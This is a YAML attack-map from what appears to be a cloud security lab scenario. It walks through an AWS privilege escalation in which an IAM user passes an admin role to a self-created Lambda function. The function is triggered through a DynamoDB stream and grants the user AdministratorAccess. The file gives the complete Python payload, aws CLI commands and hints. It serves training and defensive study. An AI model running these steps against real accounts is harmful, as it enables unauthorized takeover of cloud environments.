attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the privileged target role, lambda:CreateFunction,
        and lambda:CreateEventSourceMapping — enabling passive privilege escalation via
        a DynamoDB stream-triggered Lambda function.

    - id: lambda-function
      label: "Malicious Lambda"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-002-malicious-lambda"
      description: >
        An attacker-created Lambda function with the privileged target role attached as
        its execution role. The function contains code that calls iam:AttachUserPolicy
        to grant AdministratorAccess to the starting user. It is connected to the
        DynamoDB table stream and executes automatically whenever a record is written
        to the table — no direct invocation required.

    - id: dynamodb-stream
      label: "DynamoDB Stream"
      type: resource
      subType: dynamodb-table
      arn: "arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-admin-trigger-table"
      description: >
        A DynamoDB table with streams enabled. The attacker creates an event source
        mapping linking this table's stream to the malicious Lambda function. Any
        write to the table (by the attacker inserting a test record, or by legitimate
        application activity) triggers the Lambda to execute with its privileged role.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess. It is passed to the malicious Lambda
        function as its execution role. When the Lambda executes, it runs under this
        role's permissions and attaches AdministratorAccess to the starting user,
        completing the privilege escalation.

  edges:
    - from: starting-principal
      to: lambda-function
      label: "iam:PassRole + lambda:CreateFunction"
      description: >
        The starting user creates a new Lambda function, passing the privileged target
        role as the function's execution role. The function code is designed to call
        iam:AttachUserPolicy to grant admin access to the starting user.
      hints:
        - "Review the policy attached to this user — notice the combination of IAM and Lambda permissions. What could you do with the ability to create Lambda functions and pass roles?"
        - "Use iam:ListRoles to discover which roles exist in the account. Look for roles with AdministratorAccess that this user is allowed to pass."
        - "Use iam:GetRole on the target role to confirm its trust policy allows lambda.amazonaws.com as a service principal — this means it can be used as a Lambda execution role."
        - "Write a Lambda function that uses the boto3 IAM client to attach a managed policy to a user. Package it as a zip file before creating the function."
        - "Use lambda:CreateFunction, specifying the privileged role ARN in the --role parameter. The role you pass becomes the function's identity when it executes."
        - "Use lambda:GetFunction after creation to verify the function was deployed with the correct execution role ARN."
        - "Browse to https://pathfinding.cloud/paths/lambda-002 for technique details."
      commands:
        - description: "Create malicious Lambda function code"
          command: |
            cat > /tmp/lambda_function.py << 'EOF'
            import boto3
            import os

            def lambda_handler(event, context):
                iam = boto3.client('iam')
                user_name = os.environ['TARGET_USER']
                iam.attach_user_policy(
                    UserName=user_name,
                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                )
                return {'statusCode': 200, 'body': 'Privilege escalation complete'}
            EOF
            cd /tmp && zip lambda_payload.zip lambda_function.py
        - description: "Create Lambda function with privileged role"
          command: "aws lambda create-function --function-name pl-prod-lambda-002-malicious-lambda --runtime python3.12 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_payload.zip --environment Variables={TARGET_USER=pl-prod-lambda-002-to-admin-starting-user}"

    - from: lambda-function
      to: dynamodb-stream
      label: "lambda:CreateEventSourceMapping"
      description: >
        The starting user creates an event source mapping connecting the Lambda function
        to the DynamoDB table's stream. This causes the Lambda to execute automatically
        whenever records are written to the table — no InvokeFunction permission needed.
      hints:
        - "Your permissions include lambda:CreateEventSourceMapping but not lambda:InvokeFunction. How can you trigger this function without invoking it directly?"
        - "Use dynamodb:ListStreams or dynamodb:DescribeTable to find DynamoDB streams in the account. A stream ARN is the event source you need."
        - "Use dynamodb:DescribeTable on the trigger table to retrieve its LatestStreamArn — you'll need this ARN to create the event source mapping."
        - "Use lambda:CreateEventSourceMapping with --starting-position LATEST to connect the function to the stream. The mapping will start in 'Creating' state before becoming 'Enabled'."
        - "Use lambda:GetEventSourceMapping with the returned UUID to poll the mapping state. Wait until it reaches 'Enabled' before triggering."
      commands:
        - description: "Get the DynamoDB stream ARN"
          command: "aws dynamodb describe-table --table-name pl-prod-lambda-002-to-admin-trigger-table --query 'Table.LatestStreamArn' --output text"
        - description: "Create event source mapping to trigger Lambda from DynamoDB stream"
          command: "aws lambda create-event-source-mapping --function-name pl-prod-lambda-002-malicious-lambda --event-source-arn <stream-arn> --starting-position LATEST"

    - from: dynamodb-stream
      to: target-role
      label: "DynamoDB PutItem -> Lambda executes -> iam:AttachUserPolicy"
      description: >
        Writing a record to the DynamoDB table triggers the Lambda function via the
        stream. The Lambda executes with the target role's AdministratorAccess permissions
        and attaches AdministratorAccess to the starting user, completing the escalation.
      hints:
        - "The event source mapping is now active. Any write to the DynamoDB table will fan out to your Lambda function via the stream."
        - "Use dynamodb:PutItem to insert a record into the trigger table. This write will propagate through the stream and invoke your Lambda."
        - "After inserting a record, wait 10-15 seconds for the Lambda to execute and IAM policy changes to propagate. If the first write doesn't trigger it, insert another record — event source mappings can take a moment to fully initialize even after showing 'Enabled'."
        - "Use iam:ListAttachedUserPolicies on the starting user to check whether AdministratorAccess has been attached. Once it appears, your escalation is complete."
      commands:
        - description: "Trigger Lambda execution by inserting a record"
          command: "aws dynamodb put-item --table-name pl-prod-lambda-002-to-admin-trigger-table --item '{\"id\": {\"S\": \"trigger\"}}'"
        - description: "Verify privilege escalation succeeded"
          command: "aws iam list-attached-user-policies --user-name pl-prod-lambda-002-to-admin-starting-user"
